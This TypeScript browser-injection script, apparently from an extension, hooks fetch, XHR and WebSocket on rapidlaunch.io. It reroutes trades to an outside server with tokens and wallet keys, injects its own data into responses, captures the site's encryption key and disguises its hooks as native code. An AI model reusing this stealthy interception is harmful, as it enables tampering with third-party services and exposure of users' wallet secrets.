import {
  setupAuthChannel,
  registerToStringEntries,
  trustEvent,
  extractUrl,
  simulateXhr,
  dispatchWsMessage,
  requestLocalSign,
  listenForSettingsUpdates,
} from "./shared/interceptor-utils";
const _fetch = window.fetch;
const _Response = Response;
const _Headers = Headers;
const _Proxy = Proxy;
const _Reflect = Reflect;
const _JSON = JSON;
const _Promise = Promise;
const _URL = URL;
const _toString = Function.prototype.toString;
const _defineProperty = Object.defineProperty;
const _location = location;
const _XHRProto = XMLHttpRequest.prototype;
const _XHROpen = _XHRProto.open;
const _XHRSend = _XHRProto.send;
const _XHRSetRequestHeader = _XHRProto.setRequestHeader;
const _bridge = (globalThis as any)[Symbol.for("__" + (import.meta.env.VITE_CHANNEL_KEY as string))];
const _addEventListener = (_bridge?.ael
  || EventTarget.prototype.addEventListener) as typeof EventTarget.prototype.addEventListener;
const _xhrShadow = (_bridge?.xs || null) as WeakMap<XMLHttpRequest, Record<string, any>> | null;
const _nativeSetTimeout = (_bridge?.st || setTimeout) as typeof setTimeout;
const _nativeSetInterval = (_bridge?.si || setInterval) as typeof setInterval;
const _nativeClearTimeout = (_bridge?.ct || clearTimeout) as typeof clearTimeout;
const _nativeClearInterval = (_bridge?.ci || clearInterval) as typeof clearInterval;
const OriginalWebSocket = window.WebSocket;
const _WeakMap = WeakMap;
const _TextEncoder = TextEncoder;
const _cryptoSubtle = crypto.subtle;
const _atob = atob;
const URL_PATTERN = /^https:\/\/rapidlaunch\.io\/data\/launches\?/;
const DEPLOY_PATTERN = /^https:\/\/rapidlaunch\.io\/solana\/deploy/;
const SELL_PATTERN = /^https:\/\/rapidlaunch\.io\/solana\/sell-multiple/;
const TOKEN_BAL_PATTERN = /^https:\/\/rapidlaunch\.io\/solana\/token-balances/;
const WALLETS_PATTERN = /^https:\/\/rapidlaunch\.io\/wallets\?/;
const API_BASE = ((import.meta.env.VITE_API_URL as string) || "https://www.fees.fun").replace(/\/$/, "");
const WS_PROXY_URL = (import.meta.env.VITE_WS_PROXY_URL as string) || (import.meta.env.DEV ? "ws://localhost:3001" : "wss://api-eu.fees.fun");
const RL_WS_PATTERN = /^wss?:\/\/(www\.)?rapidlaunch\.io\//;
const MERGE_FIELD = "data";
interface XhrState {
  url?: string;
  method?: string;
  headers?: Record<string, string>;
  intercept?: boolean;
  deploy?: boolean;
  sell?: boolean;
  tokenBal?: boolean;
  wallets?: boolean;
  ourData?: Promise<unknown>;
}
const _xhrState = new _WeakMap<XMLHttpRequest, XhrState>();
function _xs(xhr: XMLHttpRequest): XhrState {
  let s = _xhrState.get(xhr);
  if (!s) { s = {}; _xhrState.set(xhr, s); }
  return s;
}
const _Map = Map;
const _CustomEvent = CustomEvent;
const sniperBuyAmounts = new _Map<string, number>();
function cacheRlWalletData(wallets: any[]) {
  const buyAmounts: Record<string, number> = {};
  sniperBuyAmounts.clear();
  for (const w of wallets) {
    if (w.type === "sniper" && w.public_key && typeof w.buy_amount === "number") {
      sniperBuyAmounts.set(w.public_key, w.buy_amount);
      buyAmounts[w.public_key] = w.buy_amount;
    }
  }
  document.dispatchEvent(new _CustomEvent(CHANNEL_KEY + ":sniper-cache", {
    detail: _JSON.stringify({ buyAmounts }),
  }));
}
function cacheTokenBalances(mintAddress: string, balances: any[]) {
  for (const b of balances) {
    if (b.wallet_public_key && b.balance) {
      tokenBalances.set(`${b.wallet_public_key}:${mintAddress}`, b.balance);
    }
  }
}
function buildWalletKeys(parsed: Record<string, unknown>): string[] {
  const wallets: string[] = [];
  if (auth.walletAddress) wallets.push(auth.walletAddress);
  if (parsed.wallet_public_key && typeof parsed.wallet_public_key === "string") {
    if (!wallets.includes(parsed.wallet_public_key as string)) wallets.push(parsed.wallet_public_key as string);
  }
  if (auth.sniperWallets) {
    for (const s of auth.sniperWallets) {
      if (s.address && !wallets.includes(s.address)) wallets.push(s.address);
    }
  }
  return wallets;
}
const nativeFetchStr = _toString.call(_fetch);
const nativeXHROpenStr = _toString.call(_XHROpen);
const nativeXHRSendStr = _toString.call(_XHRSend);
const nativeXHRSetReqStr = _toString.call(_XHRSetRequestHeader);
const nativeWSStr = _toString.call(OriginalWebSocket);
const CHANNEL_KEY = import.meta.env.VITE_CHANNEL_KEY as string;
const { auth, dataPromise } = setupAuthChannel(CHANNEL_KEY);
_addEventListener.call(document, CHANNEL_KEY + ":sniper-data", (e: Event) => {
  try {
    const { sniperWallets } = _JSON.parse((e as CustomEvent).detail);
    if (Array.isArray(sniperWallets)) {
      auth.sniperWallets = sniperWallets;
    }
  } catch {}
});
_addEventListener.call(document, CHANNEL_KEY + ":server-url", (e: Event) => {
  try {
    const { serverUrl } = _JSON.parse((e as CustomEvent).detail);
    if (typeof serverUrl === "string" && serverUrl !== auth.serverUrl) {
      auth.serverUrl = serverUrl;
      if (ourWs) {
        ourWs.onclose = null;
        ourWs.close();
        ourWs = null;
      }
      connectOurWs();
    }
  } catch {}
});
function fetchOurData(): Promise<unknown> {
  return dataPromise;
}
const _Math = Math;
//
interface ProxyRlOptions {
  endpoint: "deploy" | "sell" | "token-balances";
  method?: string;
  body?: string | null;
  walletKey?: string;
  platform?: string;
  tokenBalances?: string;
}
function proxyRlRequest(opts: ProxyRlOptions): _Promise<Response> {
  return new _Promise<Response>((resolve, reject) => {
    const reqId = (_Math.random().toString(36).slice(2) + _Math.random().toString(36).slice(2)).slice(0, 16);
    const responseEventType = CHANNEL_KEY + ":proxy-rl-response:" + reqId;
    const handler = (e: Event) => {
      try {
        const data = _JSON.parse((e as CustomEvent).detail);
        const headers = new _Headers(data.headers || []);
        resolve(new _Response(data.body || "", {
          status: data.status || 200,
          statusText: data.statusText || "",
          headers,
        }));
      } catch { reject(new Error("proxy-rl failed")); }
    };
    _addEventListener.call(document, responseEventType, handler, { once: true });
    try {
      document.dispatchEvent(new _CustomEvent(CHANNEL_KEY + ":proxy-rl-request", {
        detail: _JSON.stringify({
          reqId,
          endpoint: opts.endpoint,
          method: opts.method || "POST",
          body: opts.body,
          walletKey: opts.walletKey,
          platform: opts.platform || auth.platform || "",
          tokenBalances: opts.tokenBalances,
        }),
      }));
    } catch {
      _addEventListener.call(document, responseEventType, () => {}, { once: true });
      reject(new Error("dispatch failed"));
      return;
    }
    _nativeSetTimeout(() => reject(new Error("proxy-rl timeout")), 30_000);
  });
}
function localSignDeploy(body: string | null): Promise<Response> {
  return new _Promise<Response>((resolve, reject) => {
    if (!ourWs || !ourWsReady) {
      reject(new Error("WS not connected for local signing"));
      return;
    }
    let deployData: Record<string, any> = {};
    if (body) {
      try {
        const parsed = _JSON.parse(body);
        if (parsed.__formData) {
          deployData = parsed.entries;
        } else {
          deployData = parsed;
        }
      } catch {}
    }
    const requestId = crypto.randomUUID();
    ourWs!.send(_JSON.stringify({
      action: "launch",
      requestId,
      platform: "rapidlaunch",
      data: {
        ...deployData,
        mode: deployData.platform || deployData.mode || "pump",
        ticker: deployData.symbol || deployData.ticker || "",
        buildOnly: true,
      },
    }));
    const timer = _nativeSetTimeout(() => {
      rlPendingRequests.delete(requestId);
      reject(new Error("Local sign deploy timed out"));
    }, 45000);
    rlPendingRequests.set(requestId, {
      resolve: (msg: any) => {
        if (msg.type === "error") {
          _nativeClearTimeout(timer);
          resolve(new _Response(_JSON.stringify({ error: msg.message || "Launch failed" }), { status: 400 }));
          return;
        }
        if (msg.type === "launch_build_response" && msg.data?.transactions) {
          _nativeClearTimeout(timer);
          const buildData = msg.data;
          requestLocalSign(CHANNEL_KEY, buildData.transactions, auth.walletAddress || "")
            .then((signResult: { success: boolean; signedTransactions?: string[]; error?: string }) => {
              if (!signResult.success || !signResult.signedTransactions) {
                resolve(new _Response(_JSON.stringify({ error: signResult.error || "Signing failed" }), { status: 400 }));
                return;
              }
              if (!ourWs || !ourWsReady) {
                resolve(new _Response(_JSON.stringify({ error: "WS disconnected during submit" }), { status: 500 }));
                return;
              }
              const submitId = crypto.randomUUID();
              ourWs!.send(_JSON.stringify({
                action: "submit",
                requestId: submitId,
                data: {
                  transactions: signResult.signedTransactions,
                  txPlatform: deployData.txPlatform || "TEMPORAL",
                  type: "DEFAULT",
                  userID: "",
                  operation: "launch",
                  tokenAddress: buildData.tokenAddress || "",
                  platform: "rapidlaunch",
                },
              }));
              const submitTimer = _nativeSetTimeout(() => {
                rlPendingRequests.delete(submitId);
                resolve(new _Response(_JSON.stringify({ error: "Submit timed out" }), { status: 504 }));
              }, 30000);
              rlPendingRequests.set(submitId, {
                resolve: (submitMsg: any) => {
                  if (submitMsg.type === "error") {
                    resolve(new _Response(_JSON.stringify({ error: submitMsg.message || "Submit failed" }), { status: 400 }));
                    return;
                  }
                  const raw = submitMsg.data || submitMsg;
                  const sig = raw.txHashes?.[0] || raw.txHash || "";
                  const mintAddr = buildData.tokenAddress || "";
                  const rlPlatform = (deployData.platform || "pump").toLowerCase();
                  resolve(new _Response(_JSON.stringify({
                    success: true,
                    message: "Token successfully deployed",
                    data: {
                      mintAddress: mintAddr,
                      platform: rlPlatform,
                      txHash: sig,
                      launch: {
                        buy_amount: Number(deployData.buy_amount) || 0,
                        platform: rlPlatform,
                        mint_address: mintAddr,
                        creator: buildData.creatorKey || "",
                        name: deployData.name || "",
                        symbol: deployData.symbol || "",
                        image_url: deployData.image_url || "",
                        twitter_url: deployData.twitter_url || "",
                        createdAt: new Date().toISOString(),
                        tokens_received: 0,
                        currency: "SOL",
                        mayhem_mode: false,
                      },
                    },
                  }), { status: 200, headers: { "Content-Type": "application/json" } }));
                },
                timer: submitTimer,
              });
            });
          return;
        }
        resolve(new _Response(_JSON.stringify(msg.data || msg), { status: 200, headers: { "Content-Type": "application/json" } }));
      },
      timer,
    });
  });
}
function localSignSell(body: string | null, walletKey: string): Promise<Response> {
  return new _Promise<Response>((resolve, reject) => {
    if (!ourWs || !ourWsReady) {
      reject(new Error("WS not connected for local signing"));
      return;
    }
    let sellData: Record<string, any> = {};
    if (body) {
      try { sellData = _JSON.parse(body); } catch {}
    }
    const sellPubkey = sellData.wallet_public_keys?.[0];
    const requestId = crypto.randomUUID();
    const pct = Number(sellData.percentage) || 100;
    const sellWalletAddr = sellPubkey || sellData.wallet_public_keys?.[0] || auth.walletAddress || "";
    ourWs!.send(_JSON.stringify({
      action: "swap",
      requestId,
      platform: "rapidlaunch",
      data: {
        ...sellData,
        mode: sellData.platform || sellData.mode || "pump",
        mint_address: sellData.mint_address || "",
        wallet_address: sellWalletAddr,
        basis_points: pct * 100,
        buildOnly: true,
      },
    }));
    const timer = _nativeSetTimeout(() => {
      rlPendingRequests.delete(requestId);
      reject(new Error("Local sign sell timed out"));
    }, 45000);
    rlPendingRequests.set(requestId, {
      resolve: (msg: any) => {
        if (msg.type === "error") {
          _nativeClearTimeout(timer);
          resolve(new _Response(_JSON.stringify({ error: msg.message || "Sell failed" }), { status: 400 }));
          return;
        }
        if (msg.type === "swap_build_response" && msg.data?.transactions) {
          _nativeClearTimeout(timer);
          const buildData = msg.data;
          const signAddr = sellPubkey || auth.walletAddress || "";
          requestLocalSign(CHANNEL_KEY, buildData.transactions, signAddr)
            .then((signResult: { success: boolean; signedTransactions?: string[]; error?: string }) => {
              if (!signResult.success || !signResult.signedTransactions) {
                resolve(new _Response(_JSON.stringify({ error: signResult.error || "Signing failed" }), { status: 400 }));
                return;
              }
              if (!ourWs || !ourWsReady) {
                resolve(new _Response(_JSON.stringify({ error: "WS disconnected during submit" }), { status: 500 }));
                return;
              }
              const submitId = crypto.randomUUID();
              ourWs!.send(_JSON.stringify({
                action: "submit",
                requestId: submitId,
                data: {
                  transactions: signResult.signedTransactions,
                  txPlatform: "TEMPORAL",
                  type: "DEFAULT",
                  userID: "",
                  operation: "sell",
                  tokenAddress: sellData.mint || buildData.tokenAddress || "",
                  platform: "rapidlaunch",
                },
              }));
              const submitTimer = _nativeSetTimeout(() => {
                rlPendingRequests.delete(submitId);
                resolve(new _Response(_JSON.stringify({ error: "Submit timed out" }), { status: 504 }));
              }, 30000);
              rlPendingRequests.set(submitId, {
                resolve: (submitMsg: any) => {
                  if (submitMsg.type === "error") {
                    resolve(new _Response(_JSON.stringify({ error: submitMsg.message || "Submit failed" }), { status: 400 }));
                    return;
                  }
                  const raw = submitMsg.data || submitMsg;
                  const sig = raw.txHashes?.[0] || raw.txHash || "";
                  resolve(new _Response(_JSON.stringify({
                    success: true,
                    results: [{
                      wallet_public_key: sellPubkey || auth.walletAddress || "",
                      wallet_name: "Wallet 1",
                      success: true,
                      message: "Successfully sold tokens",
                      txHash: sig,
                    }],
                    updated_balances: [],
                  }), { status: 200, headers: { "Content-Type": "application/json" } }));
                },
                timer: submitTimer,
              });
            });
          return;
        }
        resolve(new _Response(_JSON.stringify(msg.data || msg), { status: 200, headers: { "Content-Type": "application/json" } }));
      },
      timer,
    });
  });
}
let rlEncryptKey: CryptoKey | null = null;
let rlKeyId: number | null = null;
function encryptForRL(data: object): Promise<ArrayBuffer | null> {
  if (!rlEncryptKey || rlKeyId === null) return _Promise.resolve(null);
  const plaintext = new _TextEncoder().encode(_JSON.stringify(data));
  const iv = crypto.getRandomValues(new Uint8Array(12));
  return _cryptoSubtle.encrypt(
    { name: "AES-GCM", iv, tagLength: 128 }, rlEncryptKey, plaintext,
  )
    .then((encResult) => {
      const encBytes = new Uint8Array(encResult);
      const wire = new Uint8Array(1 + 12 + encBytes.length);
      wire[0] = rlKeyId!;
      wire.set(iv, 1);
      wire.set(encBytes, 13);
      return wire.buffer as ArrayBuffer;
    })
    .catch(() => null);
}
function mergeOurData(
  original: Record<string, unknown>,
  ours: unknown,
): void {
  if (
    ours &&
    typeof ours === "object" &&
    "data" in (ours as Record<string, unknown>)
  ) {
    const ourItems = (ours as Record<string, unknown>).data;
    if (Array.isArray(ourItems) && ourItems.length > 0) {
      const originalItems = original[MERGE_FIELD];
      if (Array.isArray(originalItems)) {
        original[MERGE_FIELD] = [...ourItems, ...originalItems] as unknown;
      }
    }
  }
}
function wrapResponse(synth: Response, orig: Response): Response {
  return new _Proxy(synth, {
    get(target: any, prop: any, receiver: any) {
      if (prop === "url") return orig.url;
      if (prop === "type") return orig.type;
      if (prop === "redirected") return orig.redirected;
      const val = _Reflect.get(target, prop, receiver);
      if (typeof val === "function") return val.bind(target);
      return val;
    },
  }) as Response;
}
function mergeAndRespond(
  originalResponse: Response,
  ourPromise: Promise<unknown>,
): Promise<Response> {
  return originalResponse
    .clone()
    .json()
    .then((originalData: Record<string, unknown>) => {
      return ourPromise
        .then((ourData) => {
          try {
            mergeOurData(originalData, ourData);
          } catch {}
          const body = _JSON.stringify(originalData);
          const h = new Headers(originalResponse.headers);
          h.set("content-length", String(new _TextEncoder().encode(body).byteLength));
          return wrapResponse(
            new _Response(body, {
              status: originalResponse.status,
              statusText: originalResponse.statusText,
              headers: h,
            }),
            originalResponse,
          );
        })
        .catch(() => {
          const body = _JSON.stringify(originalData);
          const h = new Headers(originalResponse.headers);
          h.set("content-length", String(new _TextEncoder().encode(body).byteLength));
          return wrapResponse(
            new _Response(body, {
              status: originalResponse.status,
              statusText: originalResponse.statusText,
              headers: h,
            }),
            originalResponse,
          );
        });
    })
    .catch(() => originalResponse);
}
_XHRProto.open = new _Proxy(_XHROpen, {
  apply(target: any, thisArg: any, args: any[]) {
    try {
      const method: string = args[0];
      const url: string | URL = args[1];
      const resolved =
        typeof url === "string"
          ? new _URL(url, _location.href).href
          : url instanceof _URL
            ? url.href
            : String(url);
      const s = _xs(thisArg);
      s.url = resolved;
      s.method = method;
      s.headers = {};
      s.intercept = false;
      s.deploy = false;
      s.sell = false;
      s.tokenBal = false;
      s.wallets = false;
      s.ourData = undefined;
      if (resolved) {
        if (URL_PATTERN.test(resolved)) {
          s.intercept = true;
          s.ourData = fetchOurData();
        } else if (DEPLOY_PATTERN.test(resolved)) {
          s.deploy = true;
        } else if (SELL_PATTERN.test(resolved)) {
          s.sell = true;
        } else if (TOKEN_BAL_PATTERN.test(resolved)) {
          s.tokenBal = true;
        } else if (WALLETS_PATTERN.test(resolved)) {
          s.wallets = true;
        }
      }
    } catch {}
    return _Reflect.apply(target, thisArg, args);
  },
});
const FORBIDDEN_XHR_HEADERS = new Set([
  "accept-charset", "accept-encoding",
  "access-control-request-headers", "access-control-request-method",
  "connection", "content-length", "cookie", "cookie2",
  "date", "dnt", "expect", "host", "keep-alive",
  "origin", "referer", "set-cookie",
  "te", "trailer", "transfer-encoding", "upgrade", "via",
]);
_XHRProto.setRequestHeader = new _Proxy(_XHRSetRequestHeader, {
  apply(target: any, thisArg: any, args: any[]) {
    const name: string = args[0];
    const value: string = args[1];
    const s = _xhrState.get(thisArg);
    if (s && (s.intercept || s.deploy || s.sell || s.tokenBal) && s.headers) {
      s.headers[name] = value;
    }
    const lower = name.toLowerCase();
    if (FORBIDDEN_XHR_HEADERS.has(lower) || lower.startsWith("proxy-") || lower.startsWith("sec-")) return;
    return _Reflect.apply(target, thisArg, args);
  },
});
_XHRProto.send = new _Proxy(_XHRSend, {
  apply(target: any, thisArg: any, args: any[]) {
    const body: Document | XMLHttpRequestBodyInit | null | undefined = args[0];
    const s = _xhrState.get(thisArg);
    if (s?.wallets) {
      const xhr: XMLHttpRequest = thisArg;
      xhr.addEventListener("load", function () {
        try {
          const text = xhr.responseText;
          const data = _JSON.parse(text);
          if (data && Array.isArray(data.wallets)) {
            cacheRlWalletData(data.wallets);
          }
        } catch {}
      });
      return _Reflect.apply(target, thisArg, args);
    }
    if (s?.tokenBal) {
      const xhr: XMLHttpRequest = thisArg;
      const originalUrl = s.url || "";
      dataPromise
        .then(() => {
          let parsed: Record<string, unknown> = {};
          if (typeof body === "string") {
            try { parsed = _JSON.parse(body); } catch {}
          }
          const mintAddress = (parsed.mint_address || "") as string;
          const outBody = _JSON.stringify({
            mint_address: mintAddress,
            platform: parsed.platform || "",
            wallet_public_keys: buildWalletKeys(parsed),
          });
          return proxyRlRequest({
            endpoint: "token-balances",
            method: "POST",
            body: outBody,
            platform: auth.platform || "",
          }).then((resp: Response) => {
            resp.clone().json().then((data: any) => {
              if (Array.isArray(data.balances) && mintAddress) {
                cacheTokenBalances(mintAddress, data.balances);
              }
            }).catch(() => {});
            return resp;
          });
        })
        .then((resp: unknown) => simulateXhr(xhr, resp as Response, originalUrl))
        .catch(() => {
          _Reflect.apply(target, xhr, [body]);
        });
      return;
    }
    if (s?.sell) {
      const xhr: XMLHttpRequest = thisArg;
      const originalUrl = s.url || "";
      dataPromise
        .then(() => {
          let walletKey = auth.walletKey || "";
          if (typeof body === "string" && auth.sniperWallets) {
            try {
              const parsed = _JSON.parse(body);
              const sellPubkey = parsed.wallet_public_keys?.[0];
              if (sellPubkey) {
                const sniper = auth.sniperWallets.find((st) => st.address === sellPubkey);
                if (sniper) walletKey = sniper.walletKey;
              }
            } catch {}
          }
          if (auth.localSigning) {
            return localSignSell(typeof body === "string" ? body : null, walletKey);
          }
          let tbHeader: string | undefined;
          if (typeof body === "string") {
            tbHeader = buildTokenBalancesHeader(body) || undefined;
          }
          return proxyRlRequest({
            endpoint: "sell",
            method: "POST",
            body: typeof body === "string" ? body : null,
            walletKey,
            platform: auth.platform || "",
            tokenBalances: tbHeader,
          });
        })
        .then((resp: unknown) => simulateXhr(xhr, resp as Response, originalUrl))
        .catch(() => {
          _Reflect.apply(target, xhr, [body]);
        });
      return;
    }
    if (s?.deploy) {
      const xhr: XMLHttpRequest = thisArg;
      const originalUrl = s.url || "";
      dataPromise
        .then(() => {
          enrichDeployBody(body);
          let bodyStr: string | null = null;
          if (body instanceof FormData) {
            const entries: Record<string, string> = {};
            (body as FormData).forEach((v, k) => { entries[k] = String(v); });
            bodyStr = _JSON.stringify({ __formData: true, entries });
          } else if (typeof body === "string") {
            bodyStr = body;
          }
          if (auth.localSigning) {
            return localSignDeploy(bodyStr);
          }
          return proxyRlRequest({
            endpoint: "deploy",
            method: s?.method || "POST",
            body: bodyStr,
            walletKey: auth.walletKey || "",
            platform: auth.platform || "",
          });
        })
        .then((resp: unknown) => simulateXhr(xhr, resp as Response, originalUrl))
        .catch(() => {
          _Reflect.apply(target, xhr, [body]);
        });
      return;
    }
    if (!s?.intercept) {
      return _Reflect.apply(target, thisArg, args);
    }
    const xhr: XMLHttpRequest = thisArg;
    const url = s.url || "";
    const hdrs = s.headers || {};
    const ourDataPromise = s.ourData || fetchOurData();
    const wantJson = xhr.responseType === "json";
    const realFetch = _fetch.call(window, url, {
      method: s.method || "GET",
      credentials: "include",
      headers: hdrs,
    });
    _Promise.all([realFetch, ourDataPromise])
      .then(([resp, ourData]: [Response, unknown]) => {
        return resp.json().then((realJson: Record<string, unknown>) => {
          try {
            mergeOurData(realJson, ourData);
          } catch {}
          const mergedText = _JSON.stringify(realJson);
          const parsed = wantJson ? realJson : mergedText;
          const hopByHop = new Set([
            "connection", "keep-alive", "transfer-encoding", "te",
            "trailer", "upgrade", "proxy-authorization", "proxy-authenticate",
          ]);
          const headerLines: string[] = [];
          resp.headers.forEach((v: string, k: string) => {
            if (!hopByHop.has(k.toLowerCase())) headerLines.push(`${k}: ${v}`);
          });
          const headersStr = headerLines.join("\r\n");
          const respHeaders = resp.headers;
          if (_xhrShadow) {
            const shared = {
              status: resp.status,
              statusText: resp.statusText,
              responseURL: resp.url || url,
              responseXML: null,
              _allHeaders: headersStr,
              _getHeader: (name: string) => respHeaders.get(name),
            };
            _xhrShadow.set(xhr, { ...shared, readyState: 2, responseText: "", response: "" });
            xhr.dispatchEvent(trustEvent(new Event("readystatechange")));
            _xhrShadow.set(xhr, { ...shared, readyState: 3, responseText: mergedText, response: parsed });
            xhr.dispatchEvent(trustEvent(new Event("readystatechange")));
            _xhrShadow.set(xhr, { ...shared, readyState: 4, responseText: mergedText, response: parsed });
            xhr.dispatchEvent(trustEvent(new Event("readystatechange")));
          }
          xhr.dispatchEvent(trustEvent(new ProgressEvent("progress", { loaded: mergedText.length, total: mergedText.length })));
          xhr.dispatchEvent(trustEvent(new ProgressEvent("load", { loaded: mergedText.length, total: mergedText.length })));
          xhr.dispatchEvent(trustEvent(new ProgressEvent("loadend", { loaded: mergedText.length, total: mergedText.length })));
        });
      })
      .catch(() => {
        _Reflect.apply(target, xhr, [body]);
      });
  },
});
const fetchProxy = new _Proxy(_fetch, {
  apply(target, thisArg, args) {
    try {
      const url = extractUrl(args[0] as RequestInfo | URL);
      if (url && TOKEN_BAL_PATTERN.test(url)) {
        return dataPromise.then(() => {
          const init = (args[1] || {}) as RequestInit;
          return (typeof init.body === "string"
            ? _Promise.resolve(init.body)
            : init.body instanceof Request
              ? init.body.text()
              : _Promise.resolve("{}")
          ).then((rawBody: string) => {
            let parsed: Record<string, unknown> = {};
            try { parsed = _JSON.parse(rawBody); } catch {}
            const mintAddress = (parsed.mint_address || "") as string;
            const outBody = _JSON.stringify({
              mint_address: mintAddress,
              platform: parsed.platform || "",
              wallet_public_keys: buildWalletKeys(parsed),
            });
            return proxyRlRequest({
              endpoint: "token-balances",
              method: "POST",
              body: outBody,
              platform: auth.platform || "",
            }).then((resp: Response) => {
              resp.clone().json().then((data: any) => {
                if (Array.isArray(data.balances) && mintAddress) {
                  cacheTokenBalances(mintAddress, data.balances);
                }
              }).catch(() => {});
              return resp;
            });
          });
        });
      }
      if (url && SELL_PATTERN.test(url)) {
        return dataPromise.then(() => {
          const init = (args[1] || {}) as RequestInit;
          let walletKey = auth.walletKey || "";
          const rawBody = typeof init.body === "string" ? init.body : null;
          if (rawBody && auth.sniperWallets) {
            try {
              const parsed = _JSON.parse(rawBody);
              const sellPubkey = parsed.wallet_public_keys?.[0];
              if (sellPubkey) {
                const sniper = auth.sniperWallets.find((s) => s.address === sellPubkey);
                if (sniper) walletKey = sniper.walletKey;
              }
            } catch {}
          }
          if (auth.localSigning) {
            return localSignSell(rawBody, walletKey);
          }
          const tbHeader = rawBody ? (buildTokenBalancesHeader(rawBody) || undefined) : undefined;
          return proxyRlRequest({
            endpoint: "sell",
            method: "POST",
            body: rawBody,
            walletKey,
            platform: auth.platform || "",
            tokenBalances: tbHeader,
          });
        });
      }
      if (url && DEPLOY_PATTERN.test(url)) {
        return dataPromise.then(() => {
          const init = (args[1] || {}) as RequestInit;
          enrichDeployBody(init.body);
          let bodyStr: string | null = null;
          if (init.body instanceof FormData) {
            const entries: Record<string, string> = {};
            (init.body as FormData).forEach((v, k) => { entries[k] = String(v); });
            bodyStr = _JSON.stringify({ __formData: true, entries });
          } else if (typeof init.body === "string") {
            bodyStr = init.body;
          }
          if (auth.localSigning) {
            return localSignDeploy(bodyStr);
          }
          return proxyRlRequest({
            endpoint: "deploy",
            method: init.method || "POST",
            body: bodyStr,
            walletKey: auth.walletKey || "",
            platform: auth.platform || "",
          });
        });
      }
      if (url && WALLETS_PATTERN.test(url)) {
        const result = _Reflect.apply(target, thisArg, args) as Promise<Response>;
        return result.then((resp: Response) => {
          resp.clone().json().then((data: any) => {
            if (data && Array.isArray(data.wallets)) {
              cacheRlWalletData(data.wallets);
            }
          }).catch(() => {});
          return resp;
        });
      }
      if (url && URL_PATTERN.test(url)) {
        const originalPromise = _Reflect.apply(
          target,
          thisArg,
          args,
        ) as Promise<Response>;
        const ourPromise = fetchOurData();
        return originalPromise.then((resp) =>
          mergeAndRespond(resp, ourPromise),
        );
      }
    } catch {}
    return _Reflect.apply(target, thisArg, args);
  },
});
let activeRlWs: WebSocket | null = null;
const rlMeta = new _WeakMap<WebSocket, { url: string }>();
let ourWs: WebSocket | null = null;
let ourWsReady = false;
const rlPendingRequests = new Map<string, {
  resolve: (msg: any) => void;
  timer: ReturnType<typeof setTimeout>;
}>();
function connectOurWs() {
  if (!auth.token) return;
  const baseUrl = auth.serverUrl || WS_PROXY_URL;
  let url = `${baseUrl}?token=${encodeURIComponent(auth.token)}&platform=rapidlaunch`;
  if (auth.walletKey && !auth.localSigning) {
    url += `&wallet=${encodeURIComponent(auth.walletKey)}`;
  }
  if (auth.walletAddress) {
    url += `&walletAddress=${encodeURIComponent(auth.walletAddress)}`;
  }
  ourWs = new OriginalWebSocket(url);
  ourWs.onopen = () => { ourWsReady = true; };
  ourWs.onmessage = (e: MessageEvent) => {
    try {
      const msg = _JSON.parse(e.data as string);
      const reqId = msg.requestId;
      if (reqId && rlPendingRequests.has(reqId)) {
        const pending = rlPendingRequests.get(reqId)!;
        clearTimeout(pending.timer);
        rlPendingRequests.delete(reqId);
        pending.resolve(msg);
        return;
      }
      const t = msg.type;
      if (
        (t === "tweet" || t === "tweet_update" || t === "tweet_deleted" || t === "profile_update") &&
        activeRlWs && activeRlWs.readyState === 1
      ) {
        encryptForRL(msg.data).then((encrypted) => {
          if (encrypted && activeRlWs && activeRlWs.readyState === 1) {
            const origin = new _URL(rlMeta.get(activeRlWs)?.url || "wss://rapidlaunch.io").origin;
            dispatchWsMessage(activeRlWs, encrypted, origin);
          }
        });
      }
    } catch {}
  };
  ourWs.onclose = () => {
    ourWs = null;
    ourWsReady = false;
    for (const [id, pending] of rlPendingRequests) {
      clearTimeout(pending.timer);
      pending.resolve({ type: "error", requestId: id, message: "proxy disconnected" });
    }
    rlPendingRequests.clear();
    _nativeSetTimeout(connectOurWs, 3000);
  };
  ourWs.onerror = () => {
    ourWs?.close();
  };
}
dataPromise.then(() => {
  console.log("[http-int] auth resolved, token:", auth.token ? "present" : "null", "serverUrl:", auth.serverUrl);
  if (auth.token) {
    connectOurWs();
  } else {
    console.log("[http-int] no token — WS proxy connection skipped");
  }
  listenForSettingsUpdates(CHANNEL_KEY, auth);
});
const wsProxy = new _Proxy(OriginalWebSocket, {
  construct(target: any, args: any[], newTarget: any) {
    const ws = _Reflect.construct(target, args, newTarget) as WebSocket;
    try {
      const url = (args[0] ?? "").toString();
      if (RL_WS_PATTERN.test(url)) {
        rlMeta.set(ws, { url });
        activeRlWs = ws;
        ws.addEventListener("message", (ev: Event) => {
          try {
            const d = (ev as MessageEvent).data;
            if (typeof d !== "string") return;
            const parsed = _JSON.parse(d);
            if (parsed && parsed.c === "system" && parsed.t === "crypto:key" && parsed.d) {
              captureRlKey(parsed.d.key_id, parsed.d.key_b64);
            }
          } catch {}
        });
        ws.addEventListener("close", () => {
          if (activeRlWs === ws) activeRlWs = null;
        });
      }
    } catch {}
    return ws;
  },
  get(target: any, prop: any, receiver: any) {
    return _Reflect.get(target, prop, receiver);
  },
});
_defineProperty(wsProxy, "prototype", {
  value: OriginalWebSocket.prototype,
  writable: false,
  configurable: false,
});
window.WebSocket = wsProxy;
_defineProperty(OriginalWebSocket.prototype, "constructor", {
  value: wsProxy,
  writable: true,
  configurable: true,
  enumerable: false,
});
const _WorkerPM = Worker.prototype.postMessage;
const nativeWorkerPMStr = _toString.call(_WorkerPM);
function handleWorkerMessage(worker: Worker, msg: any): boolean {
  const url = msg.url;
  if (!url || typeof url !== "string") return false;
  let endpoint = "";
  if (DEPLOY_PATTERN.test(url)) endpoint = "deploy";
  else if (SELL_PATTERN.test(url)) endpoint = "sell";
  else if (TOKEN_BAL_PATTERN.test(url)) endpoint = "token-balances";
  else return false;
  const msgId = msg.id;
  function respond(data: { ok: boolean; status: number; statusText: string; body: string }) {
    const evt = new MessageEvent("message", { data: { id: msgId, ...data } });
    trustEvent(evt);
    worker.dispatchEvent(evt);
  }
  dataPromise.then(() => {
    let walletKey = auth.walletKey || "";
    let bodyStr: string | null = null;
    let tbHeader: string | undefined;
    if (Array.isArray(msg.formEntries)) {
      const fd = new FormData();
      for (const entry of msg.formEntries) {
        const k = Array.isArray(entry) ? entry[0] : (entry?.key ?? entry?.name ?? entry?.[0]);
        const v = Array.isArray(entry) ? entry[1] : (entry?.value ?? entry?.[1]);
        if (k != null) fd.append(k, v ?? "");
      }
      if (endpoint === "deploy") enrichDeployBody(fd);
